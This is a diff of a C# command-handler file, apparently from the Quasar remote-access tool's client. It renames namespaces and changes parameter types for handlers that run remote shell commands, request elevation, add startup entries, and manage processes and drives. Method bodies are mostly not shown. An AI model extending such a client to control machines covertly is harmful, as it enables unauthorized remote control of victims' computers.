@@ -1,27 +1,27 @@
-﻿using Microsoft.Win32;
-using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.NetworkInformation;
 using System.Windows.Forms;
-using xClient.Config;
-using xClient.Core.Data;
-using xClient.Core.Extensions;
-using xClient.Core.Helper;
-using xClient.Core.Networking;
-using xClient.Core.Utilities;
+using Microsoft.Win32;
+using Quasar.Client.Config;
+using Quasar.Client.Core.Data;
+using Quasar.Client.Core.Extensions;
+using Quasar.Client.Core.Helper;
+using Quasar.Client.Core.Utilities;
+using Quasar.Common.Enums;
+using Quasar.Common.Messages;
 using Models = Quasar.Common.Models;
+using Process = System.Diagnostics.Process;
 
-namespace xClient.Core.Commands
+namespace Quasar.Client.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
     public static partial class CommandHandler
     {
-        public static void HandleGetDrives(GetDrives command, Client client)
+        public static void HandleGetDrives(GetDrives command, Networking.Client client)
         {
             DriveInfo[] driveInfos;
             try
@@ -69,7 +69,7 @@ namespace xClient.Core.Commands
             client.Send(new GetDrivesResponse {Drives = drives});
         }
 
-        public static void HandleDoShutdownAction(DoShutdownAction command, Client client)
+        public static void HandleDoShutdownAction(DoShutdownAction command, Networking.Client client)
         {
             try
             {
@@ -101,7 +101,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleGetStartupItems(GetStartupItems command, Client client)
+        public static void HandleGetStartupItems(GetStartupItems command, Networking.Client client)
         {
             try
             {
@@ -194,7 +194,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Client client)
+        public static void HandleDoStartupItemAdd(DoStartupItemAdd command, Networking.Client client)
         {
             try
             {
@@ -274,7 +274,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Client client)
+        public static void HandleDoStartupItemRemove(DoStartupItemRemove command, Networking.Client client)
         {
             try
             {
@@ -344,7 +344,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleGetSystemInfo(GetSystemInfo command, Client client)
+        public static void HandleGetSystemInfo(GetSystemInfo command, Networking.Client client)
         {
             try
             {
@@ -382,7 +382,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleGetProcesses(GetProcesses command, Client client)
+        public static void HandleGetProcesses(GetProcesses command, Networking.Client client)
         {
             Process[] pList = Process.GetProcesses();
             var processes = new Models.Process[pList.Length];
@@ -401,7 +401,7 @@ namespace xClient.Core.Commands
             client.Send(new GetProcessesResponse {Processes = processes});
         }
 
-        public static void HandleDoProcessStart(DoProcessStart command, Client client)
+        public static void HandleDoProcessStart(DoProcessStart command, Networking.Client client)
         {
             if (string.IsNullOrEmpty(command.ApplicationName))
             {
@@ -428,7 +428,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoProcessKill(DoProcessKill command, Client client)
+        public static void HandleDoProcessKill(DoProcessKill command, Networking.Client client)
         {
             try
             {
@@ -443,7 +443,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoAskElevate(DoAskElevate command, Client client)
+        public static void HandleDoAskElevate(DoAskElevate command, Networking.Client client)
         {
             if (WindowsAccountHelper.GetAccountType() != "Admin")
             {
@@ -475,7 +475,7 @@ namespace xClient.Core.Commands
             }
         }
         
-        public static void HandleDoShellExecute(DoShellExecute command, Client client)
+        public static void HandleDoShellExecute(DoShellExecute command, Networking.Client client)
         {
             string input = command.Command;
 
